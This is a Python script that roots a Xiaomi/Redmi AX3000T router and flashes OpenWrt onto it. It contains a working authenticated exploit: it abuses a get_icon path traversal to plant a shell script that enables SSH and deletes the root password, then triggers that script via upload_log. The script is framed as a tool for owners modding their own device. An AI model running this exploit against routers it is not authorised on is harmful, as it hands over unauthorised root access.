#!/usr/bin/env python3
"""
Xiaomi/Redmi AX3000T (RD03/RD23) -> OpenWrt one-shot flasher.
Verified against stock firmware 1.0.97 on 2026-08-25.

Full auto pipeline, start to finish, one command (unconfigured router,
"inited": 0 in init_info). This flashes the initramfs image, waits for the
reboot, then automatically runs the final sysupgrade too - no second
invocation needed:
    python3 ax3000t_auto_openwrt.py \
        --admin-password 'YourStrongPass123!' \
        --wifi-ssid 'OpenWrt-Setup' \
        --ssh-pubkey-path ~/.ssh/id_ed25519.pub \
        --openwrt-password 'YourFinalRootPass456!'

Router already configured with a known admin password:
    python3 ax3000t_auto_openwrt.py --already-initialized \
        --admin-password 'xxxx' --ssh-pubkey-path ~/.ssh/id_ed25519.pub \
        --openwrt-password 'YourFinalRootPass456!'

Only shell access, skip flashing:
    python3 ax3000t_auto_openwrt.py --ssh --admin-password 'xxxx' \
        --ssh-pubkey-path ~/.ssh/id_ed25519.pub

Stop after flashing instead of auto-finishing (manual two-step):
    python3 ax3000t_auto_openwrt.py --no-finish \
        --admin-password 'xxxx' --ssh-pubkey-path ~/.ssh/id_ed25519.pub
    python3 ax3000t_auto_openwrt.py --finish-only \
        --ssh-pubkey-path ~/.ssh/id_ed25519.pub --openwrt-password 'yyyy'

Resume the final sysupgrade on its own (e.g. after an interrupted run):
    python3 ax3000t_auto_openwrt.py --finish-only \
        --ssh-pubkey-path ~/.ssh/id_ed25519.pub --openwrt-password 'yyyy'

Only run this against a router you own.
"""
import argparse
import base64
import functools
import getpass
import hashlib
import http.server
import random
import secrets
import shlex
import string
import sys
import threading
import time
from pathlib import Path

import paramiko
import requests
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

CLIENT_KEY = "a2ffa5c9be07488bbb04a3a47d3c5f6a"
CLIENT_IV = "64175472480004614961023454661220"
ROUTER_IP_STOCK = "192.168.31.1"
ROUTER_IP_OPENWRT = "192.168.3.1"
OWRT_VERSION = "24.10.5"
IMG_INITRAMFS = f"openwrt-{OWRT_VERSION}-mediatek-filogic-xiaomi_mi-router-ax3000t-initramfs-factory.ubi"
IMG_SYSUPGRADE = f"openwrt-{OWRT_VERSION}-mediatek-filogic-xiaomi_mi-router-ax3000t-squashfs-sysupgrade.bin"
BASE_URL = f"https://downloads.openwrt.org/releases/{OWRT_VERSION}/targets/mediatek/filogic"

ENABLE_SSH_SCRIPT = """#!/bin/sh
nvram set ssh_en=1
nvram commit
sed -i 's/channel=.*/channel="debug"/' /etc/init.d/dropbear
/etc/init.d/dropbear start
passwd -d root
exit 0
"""


def ok(msg):
    print(f"[+] {msg}")


def fail(msg):
    print(f"[-] {msg}")


def confirm(prompt):
    ans = input(f"{prompt} [y/N] ").strip().lower()
    if ans != "y":
        fail("Aborted by user.")
        sys.exit(1)


def local_ip_for(dst):
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((dst, 80))
        return s.getsockname()[0]
    finally:
        s.close()


def wait_until(check_fn, timeout, interval, label):
    """Poll check_fn() every `interval` seconds until it returns truthy or `timeout` elapses.
    Exceptions from check_fn count as "not ready yet" rather than aborting the wait."""
    deadline = time.time() + timeout
    attempt = 0
    while True:
        attempt += 1
        try:
            if check_fn():
                return True
        except Exception:
            pass
        remaining = deadline - time.time()
        if remaining <= 0:
            fail(f"Gave up waiting for {label} after {timeout}s.")
            return False
        print(f"[.] Waiting for {label}... (attempt {attempt}, retrying in {interval}s, ~{int(remaining)}s left)")
        time.sleep(interval)


class XiaomiCrypto:
    """Re-implements the router web UI's Encrypt helper (login hash + admin-password AES payload)."""

    def __init__(self, key=CLIENT_KEY, iv=CLIENT_IV):
        self.key = key
        self.iv = bytes.fromhex(iv)

    @staticmethod
    def sha(data, algo):
        h = hashlib.sha256 if algo == "sha256" else hashlib.sha1
        return h(data.encode()).hexdigest()

    def gen_nonce(self, mac=""):
        """Real browsers only have a "mac" cookie after the router has echoed one back, so a
        fresh session's nonce has an empty mac segment; set_router_normal's nonce-verification
        rejects a fabricated mac here even though /xqsystem/login tolerates it."""
        return f"0_{mac}_{int(time.time())}_{random.randint(0, 9999)}"

    def login_hash(self, password, nonce, algo):
        inner = self.sha(password + self.key, algo)
        return self.sha(nonce + inner, algo)

    def _aes_encrypt(self, aes_key_plain, plaintext_str):
        aes_key = bytes.fromhex(aes_key_plain[:32])
        padder = sym_padding.PKCS7(128).padder()
        data = padder.update(plaintext_str.encode()) + padder.finalize()
        enc = Cipher(algorithms.AES(aes_key), modes.CBC(self.iv)).encryptor()
        ct = enc.update(data) + enc.finalize()
        return base64.b64encode(ct).decode()

    def admin_password_fields(self, new_password, nonce, default_password="admin"):
        """Fields required by /api/misystem/set_router_normal to set the admin password
        for the very first time (router state: init_info.inited == 0)."""
        fields = {"nonce": nonce, "oldPwd": self.login_hash(default_password, nonce, "sha256")}
        for algo, key in (("sha1", "newPwd"), ("sha256", "newPwd256")):
            aes_key_plain = self.sha(default_password + self.key, algo)
            plaintext = self.sha(new_password + self.key, algo)
            fields[key] = self._aes_encrypt(aes_key_plain, plaintext)
        return fields


class XiaomiRouter:
    """Stock Xiaomi/Redmi miwifi firmware: state detection, first-time init, login, and the
    get_icon/upload_log path-traversal exploit used to obtain a root shell without SSH creds."""

    def __init__(self, ip=ROUTER_IP_STOCK):
        self.ip = ip
        self.crypto = XiaomiCrypto()
        self.stok = None

    def _api(self, path, stok=None, **kwargs):
        stok_seg = f";stok={stok}/" if stok else ""
        return requests.post(f"http://{self.ip}/cgi-bin/luci/{stok_seg}api/{path}", timeout=10, **kwargs)

    def init_info(self):
        r = requests.get(f"http://{self.ip}/cgi-bin/luci/api/xqsystem/init_info", timeout=10)
        return r.json()

    def is_initialized(self):
        return bool(self.init_info().get("inited"))

    def wait_until_reachable(self, timeout=60, interval=5):
        """Poll the stock web UI until it answers. Covers both a freshly-plugged-in router
        still booting, and the brief drop while it applies a just-submitted config change."""
        return wait_until(lambda: self.init_info() is not None, timeout, interval, f"router at {self.ip}")

    def initialize(self, admin_password, wifi_ssid, wifi_password, default_password="admin"):
        """First-run setup wizard: sets the admin password and 2.4/5GHz Wi-Fi credentials
        in one call to /api/misystem/set_router_normal (routing mode).

        An unconfigured router (init_info.inited == 0) still requires a stok: logging in
        with the default password "admin" (SHA256 mode) succeeds and hands one out."""
        if self.is_initialized():
            ok("Router already initialized, skipping first-run setup.")
            return True

        if not self.login(default_password):
            fail("init: could not log in with the default password to obtain a stok.")
            return False

        nonce = self.crypto.gen_nonce()
        payload = self.crypto.admin_password_fields(admin_password, nonce, default_password)
        payload.update({
            "locale": "en",
            "name": wifi_ssid,
            "ssid": wifi_ssid,
            "password": wifi_password,
            "ssid5g": wifi_ssid + "_5G",
            "password5g": wifi_password,
            "encryption": "mixed-psk",
            "txpwr": 1,
            "bw160": 0,
            "bsd": 1,
            "routerPwd": admin_password,
        })
        r = self._api("misystem/set_router_normal", stok=self.stok, data=payload)
        try:
            data = r.json()
        except ValueError:
            fail(f"init: non-JSON response: {r.text[:200]}")
            return False
        if data.get("code") != 0:
            fail(f"init: set_router_normal failed: {data}")
            return False
        ok("Router initialized (admin password + Wi-Fi set).")
        if not self.wait_until_reachable(timeout=60, interval=5):
            fail("Router did not come back up after applying its first-run config.")
            return False
        return True

    def login(self, password):
        """Try SHA256 first (matches newEncryptMode=1 firmware), fall back to SHA1."""
        data = {}
        for algo in ("sha256", "sha1"):
            nonce = self.crypto.gen_nonce()
            pwhash = self.crypto.login_hash(password, nonce, algo)
            try:
                r = self._api(
                    "xqsystem/login",
                    data={"username": "admin", "logtype": "2", "password": pwhash, "nonce": nonce},
                )
            except requests.RequestException as e:
                fail(f"Login request failed: {e}")
                return None
            data = r.json() if r.headers.get("content-type", "").startswith("application/json") or r.text.startswith("{") else {}
            if data.get("code") == 0 and "token" in data:
                ok(f"Got stok via {algo.upper()} login: {data['token']}")
                self.stok = data["token"]
                return self.stok
        fail(f"Login failed with both SHA1 and SHA256 (last response: {data})")
        return None

    def get_shell(self):
        """Use the authenticated stok to plant an init script via the get_icon path-traversal
        bug, then trigger it via upload_log. Leaves stock firmware with dropbear (SSH) open
        and an empty root password."""
        if not self.stok:
            fail("get_shell: not logged in, call login() first.")
            return False

        my_ip = local_ip_for(self.ip)
        payload_dir = Path("work/httpserve/etc/diag_info/stat/firewall")
        payload_dir.mkdir(parents=True, exist_ok=True)
        (payload_dir / "enable-ssh.sh").write_text(ENABLE_SSH_SCRIPT)
        (payload_dir / "enable-ssh.sh").chmod(0o755)

        root_dir = str(Path("work/httpserve"))
        handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=root_dir)
        http.server.ThreadingHTTPServer.allow_reuse_address = True
        httpd = http.server.ThreadingHTTPServer(("0.0.0.0", 8000), handler)
        thread = threading.Thread(target=httpd.serve_forever, daemon=True)
        thread.start()
        ok(f"Local payload server up on {my_ip}:8000")

        def attempt():
            r = self._api(
                "xqsystem/get_icon", stok=self.stok,
                params={"ip": f"{my_ip}:8000", "name": "../../../../etc/diag_info/stat/firewall/enable-ssh.sh"},
            )
            if "nvram set ssh_en" not in r.text:
                fail(f"get_icon exploit did not echo back payload (response: {r.text[:200]})")
                return False
            ok("Payload delivered to router via get_icon path traversal.")

            r = self._api("xqsystem/upload_log", stok=self.stok)
            ok(f"Triggered execution via upload_log (router responded: {r.text[:100]})")
            return True

        try:
            # The router can still be settling from init/login (network stack restarting),
            # so a timed-out or refused exploit request is retried rather than treated as fatal.
            deadline = time.time() + 60
            succeeded = False
            attempt_no = 0
            while True:
                attempt_no += 1
                try:
                    succeeded = attempt()
                except requests.RequestException as e:
                    remaining = deadline - time.time()
                    if remaining <= 0:
                        fail(f"Exploit request failed after retrying: {e}")
                        break
                    print(f"[.] Exploit request failed ({e}), retrying in 5s... (attempt {attempt_no}, ~{int(remaining)}s left)")
                    time.sleep(5)
                    continue
                break
        finally:
            time.sleep(1)
            httpd.shutdown()

        if not succeeded:
            return False

        return SSHClient(self.ip).verify()


class SSHClient:
    """Thin paramiko wrapper for the router's dropbear, which has no sftp-server so files are
    streamed in/out via `cat`."""

    def __init__(self, ip):
        self.ip = ip

    def _connect(self, timeout=10):
        t = paramiko.Transport((self.ip, 22))
        t.start_client(timeout=timeout)
        try:
            t.auth_none("root")
        except paramiko.BadAuthenticationType:
            pass
        return t

    def verify(self, tries=5, delay=2):
        for _ in range(tries):
            try:
                t = self._connect(timeout=6)
                if t.is_authenticated():
                    chan = t.open_session()
                    chan.exec_command("cat /proc/cmdline")
                    time.sleep(0.5)
                    out = chan.recv(4096).decode(errors="replace")
                    t.close()
                    ok(f"SSH confirmed working. /proc/cmdline: {out.strip()}")
                    return True
                t.close()
            except Exception:
                pass
            time.sleep(delay)
        fail("Could not confirm SSH access.")
        return False

    def wait_until_reachable(self, tries=36, delay=5):
        """Poll for SSH coming back up (e.g. after a reboot/sysupgrade)."""
        for attempt in range(1, tries + 1):
            try:
                t = self._connect(timeout=5)
                if t.is_authenticated():
                    t.close()
                    return True
                t.close()
            except Exception:
                pass
            remaining = (tries - attempt) * delay
            if attempt < tries:
                print(f"[.] Waiting for SSH on {self.ip}... (attempt {attempt}, retrying in {delay}s, ~{remaining}s left)")
            time.sleep(delay)
        return False

    def set_root_password(self, password):
        quoted = shlex.quote(password)
        status, out = self.run(f"(echo {quoted}; echo {quoted}) | passwd root")
        if status != 0:
            fail(f"Could not set root password:\n{out}")
            return False
        ok("Root password set.")
        return True

    def run(self, command, timeout=120):
        t = self._connect()
        chan = t.open_session()
        chan.settimeout(timeout)
        chan.exec_command(command)
        out = b""
        while True:
            if chan.recv_ready():
                out += chan.recv(65536)
            if chan.exit_status_ready() and not chan.recv_ready():
                break
            time.sleep(0.2)
        status = chan.recv_exit_status()
        t.close()
        return status, out.decode(errors="replace")

    def put(self, local_path, remote_path):
        data = Path(local_path).read_bytes()
        t = self._connect()
        chan = t.open_session()
        chan.settimeout(120)
        chan.exec_command(f"cat > {remote_path}")
        chan.sendall(data)
        chan.shutdown_write()
        while not chan.exit_status_ready():
            time.sleep(0.2)
        status = chan.recv_exit_status()
        t.close()
        if status != 0:
            raise IOError(f"remote cat > {remote_path} exited {status}")

    def get(self, remote_path, local_path):
        t = self._connect()
        chan = t.open_session()
        chan.settimeout(120)
        chan.exec_command(f"cat {remote_path}")
        out = b""
        while True:
            if chan.recv_ready():
                out += chan.recv(1 << 16)
            if chan.exit_status_ready() and not chan.recv_ready():
                break
            time.sleep(0.05)
        status = chan.recv_exit_status()
        t.close()
        if status != 0:
            raise IOError(f"remote cat {remote_path} exited {status}")
        Path(local_path).write_bytes(out)


class SSHKeyInstaller:
    """Installs a local SSH public key into dropbear's authorized_keys, so the empty-password
    root shell opened by XiaomiRouter.get_shell() can be replaced with key-based auth."""

    def __init__(self, ssh: SSHClient, pubkey_path):
        self.ssh = ssh
        self.pubkey_path = Path(pubkey_path).expanduser()

    def install(self):
        if not self.pubkey_path.is_file():
            fail(f"SSH public key not found: {self.pubkey_path}")
            return False
        pubkey = self.pubkey_path.read_text().strip()
        if not pubkey.startswith(("ssh-ed25519", "ssh-rsa", "ecdsa-sha2-")):
            fail(f"{self.pubkey_path} does not look like a public key (must be the .pub file).")
            return False

        cmd = (
            "mkdir -p /etc/dropbear && "
            f"grep -qxF '{pubkey}' /etc/dropbear/authorized_keys 2>/dev/null || "
            f"echo '{pubkey}' >> /etc/dropbear/authorized_keys && "
            "chmod 600 /etc/dropbear/authorized_keys"
        )
        status, out = self.ssh.run(cmd)
        if status != 0:
            fail(f"Could not install public key:\n{out}")
            return False
        ok(f"Installed public key from {self.pubkey_path} into /etc/dropbear/authorized_keys")
        return True


class OpenWrtFlasher:
    """Backs up NAND, downloads/flashes the OpenWrt initramfs image over the running stock
    firmware, then (after the reboot) sysupgrades to the full squashfs image."""

    def __init__(self, workdir=Path("work")):
        self.workdir = workdir
        self.workdir.mkdir(exist_ok=True)

    @staticmethod
    def download(url, dest: Path):
        if dest.exists():
            ok(f"Already downloaded: {dest.name}")
            return
        ok(f"Downloading {url} ...")
        with requests.get(url, stream=True, timeout=60) as r:
            r.raise_for_status()
            with open(dest, "wb") as f:
                for chunk in r.iter_content(1 << 16):
                    f.write(chunk)
        ok(f"Downloaded {dest.name}")

    def backup_nand(self, ssh: SSHClient, mtds=(1, 2, 3, 4, 5, 8, 12)):
        backup_dir = self.workdir / "backup"
        backup_dir.mkdir(exist_ok=True)
        for m in mtds:
            status, _ = ssh.run(f"nanddump -f /tmp/mtd{m}.bin /dev/mtd{m}")
            if status == 0:
                ok(f"Backed up mtd{m}")
            else:
                fail(f"Backup of mtd{m} failed (may not exist, continuing)")
        for m in mtds:
            try:
                ssh.get(f"/tmp/mtd{m}.bin", backup_dir / f"mtd{m}.bin")
                ok(f"Pulled mtd{m}.bin to {backup_dir}")
            except Exception as e:
                fail(f"Could not pull mtd{m}.bin: {e}")

    def flash_initramfs(self, ssh: SSHClient):
        img_path = self.workdir / IMG_INITRAMFS
        self.download(f"{BASE_URL}/{IMG_INITRAMFS}", img_path)

        status, out = ssh.run("cat /proc/cmdline")
        if status != 0 or "firmware=" not in out:
            fail(f"Could not detect firmware slot: {out}")
            sys.exit(1)
        slot = "0" if "firmware=0" in out else "1"
        target_mtd = 9 if slot == "0" else 8
        ok(f"Active slot firmware={slot}, will flash inactive slot /dev/mtd{target_mtd}")
        confirm(f"Confirm flashing /dev/mtd{target_mtd} matches the OpenWrt wiki for this device?")

        ssh.put(img_path, f"/tmp/{IMG_INITRAMFS}")
        ok("Image uploaded to router.")

        status, out = ssh.run(f"ubiformat /dev/mtd{target_mtd} -y -f /tmp/{IMG_INITRAMFS}", timeout=180)
        if status != 0:
            fail(f"ubiformat failed:\n{out}")
            sys.exit(1)
        ok("ubiformat succeeded.")

        if slot == "0":
            nvram_pair = ("flag_boot_rootfs=1", "flag_last_success=1")
        else:
            nvram_pair = ("flag_boot_rootfs=0", "flag_last_success=0")
        set_cmds = "; ".join([
            "nvram set boot_wait=on",
            "nvram set uart_en=1",
            f"nvram set {nvram_pair[0]}",
            f"nvram set {nvram_pair[1]}",
            "nvram set flag_boot_success=1",
            "nvram set flag_try_sys1_failed=0",
            "nvram set flag_try_sys2_failed=0",
            "nvram commit",
        ])
        status, out = ssh.run(set_cmds)
        if status == 0:
            ok("nvram boot flags set.")
        else:
            fail(f"nvram set failed:\n{out}")
            sys.exit(1)

        confirm("Ready to reboot the router into OpenWrt initramfs now?")
        try:
            ssh.run("reboot", timeout=5)
        except Exception:
            pass
        ok("Reboot triggered.")

    def finish_sysupgrade(self, ssh_pubkey_path, openwrt_password=None):
        ssh = SSHClient(ROUTER_IP_OPENWRT)
        ok(f"Waiting for the OpenWrt initramfs to come up at {ROUTER_IP_OPENWRT}...")
        if not ssh.wait_until_reachable(tries=36, delay=5):  # ~3 min budget
            fail(f"Router did not come up at {ROUTER_IP_OPENWRT}. "
                 f"Check it booted correctly, then re-run --finish-only.")
            sys.exit(1)

        img_path = self.workdir / IMG_SYSUPGRADE
        self.download(f"{BASE_URL}/{IMG_SYSUPGRADE}", img_path)

        try:
            ssh.put(img_path, f"/tmp/{IMG_SYSUPGRADE}")
            ok("Sysupgrade image uploaded.")
        except Exception as e:
            fail(f"Could not upload sysupgrade image: {e}")
            sys.exit(1)

        t = ssh._connect()
        chan = t.open_session()
        chan.exec_command(f"sysupgrade -n /tmp/{IMG_SYSUPGRADE}")
        time.sleep(2)
        t.close()
        ok("Sysupgrade triggered. Router is rebooting into full OpenWrt.")

        # sysupgrade -n resets /etc, so the key + password installed on the initramfs stage
        # are gone; the freshly-booted image has no root password and no authorized_keys.
        ok("Waiting for the router to come back up (this can take 1-2 minutes)...")
        if not ssh.wait_until_reachable():
            fail(f"Router did not come back up at {ROUTER_IP_OPENWRT} in time. "
                 f"Reconnect manually once it is up and re-run --finish-only.")
            sys.exit(1)

        if not SSHKeyInstaller(ssh, ssh_pubkey_path).install():
            fail("Sysupgrade succeeded but the SSH key could not be reinstalled.")
            sys.exit(1)

        password = openwrt_password or generate_password()
        if not ssh.set_root_password(password):
            fail("Sysupgrade succeeded but the root password could not be set.")
            sys.exit(1)

        print_access_summary(ROUTER_IP_OPENWRT, password, ssh_pubkey_path)


def generate_password(length=16):
    alphabet = string.ascii_letters + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length))


def print_access_summary(ip, password, ssh_pubkey_path):
    private_key_hint = str(Path(ssh_pubkey_path).with_suffix(""))
    print()
    print("=" * 60)
    print("  OpenWrt flash complete - router access")
    print("=" * 60)
    print(f"  Dashboard (LuCI):  http://{ip}/")
    print(f"  Username:          root")
    print(f"  Password:          {password}")
    print(f"  SSH:               ssh -i {private_key_hint} root@{ip}")
    print("=" * 60)
    print("  Note: the router's SSH host key changed after the final")
    print(f"  sysupgrade. If your SSH client refuses to connect, run:")
    print(f"      ssh-keygen -R {ip}")
    print("=" * 60)
    print()


def main(args):
    if args.finish_only:
        OpenWrtFlasher().finish_sysupgrade(args.ssh_pubkey_path, args.openwrt_password)
        return

    router = XiaomiRouter(args.ip)

    if not router.wait_until_reachable(timeout=60, interval=5):
        fail(f"Router not reachable at {router.ip} after 60s, aborting.")
        sys.exit(1)

    if not args.already_initialized:
        wifi_password = args.wifi_password or args.admin_password
        if not router.initialize(args.admin_password, args.wifi_ssid, wifi_password):
            fail("Router initialization failed, aborting.")
            sys.exit(1)

    if not router.login(args.admin_password):
        fail("Could not obtain stok, aborting.")
        sys.exit(1)

    if not router.get_shell():
        fail("Exploit ran but SSH could not be confirmed.")
        sys.exit(1)

    ssh = SSHClient(router.ip)
    if not SSHKeyInstaller(ssh, args.ssh_pubkey_path).install():
        fail("Could not install SSH public key, aborting.")
        sys.exit(1)

    if args.ssh:
        ok("SSH is open and key-based auth is installed on the stock firmware. Stopping here (--ssh).")
        return

    flasher = OpenWrtFlasher()
    confirm("This backs up partitions then OVERWRITES the inactive firmware slot. Continue?")
    flasher.backup_nand(ssh)
    flasher.flash_initramfs(ssh)

    if args.no_finish:
        ok("Flash complete. Router is rebooting. Skipping the final sysupgrade (--no-finish); "
           "run with --finish-only later to complete it.")
        return

    flasher.finish_sysupgrade(args.ssh_pubkey_path, args.openwrt_password)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--ip", default=ROUTER_IP_STOCK, help="stock firmware IP (default: %(default)s)")
    parser.add_argument("--already-initialized", action="store_true",
                         help="skip the first-run setup wizard; router already has an admin password")
    parser.add_argument("--admin-password", default=None,
                         help="admin password to set (first run) or log in with (already initialized); prompted if omitted")
    parser.add_argument("--wifi-ssid", default="OpenWrt-Setup",
                         help="SSID to set during first-run init (default: %(default)s)")
    parser.add_argument("--wifi-password", default=None,
                         help="Wi-Fi password to set during first-run init (defaults to --admin-password)")
    parser.add_argument("--ssh-pubkey-path", default=str(Path.home() / ".ssh" / "id_ed25519.pub"),
                         help="local SSH public key to install on the router (default: %(default)s)")
    parser.add_argument("--openwrt-password", default=None,
                         help="root password to set on the final OpenWrt image (default: randomly generated)")
    parser.add_argument("--ssh", action="store_true",
                         help="stop after opening SSH + installing the key; do not flash OpenWrt")
    parser.add_argument("--finish-only", action="store_true",
                         help="skip everything else; only run the post-reboot sysupgrade step")
    parser.add_argument("--no-finish", action="store_true",
                         help="stop after flashing the initramfs image and rebooting; "
                              "by default the script waits and automatically runs the final "
                              "sysupgrade step itself")

    args = parser.parse_args()

    if not args.finish_only and not args.admin_password:
        args.admin_password = getpass.getpass(
            "Admin password to set (first run) / log in with (already initialized): "
        )

    main(args)
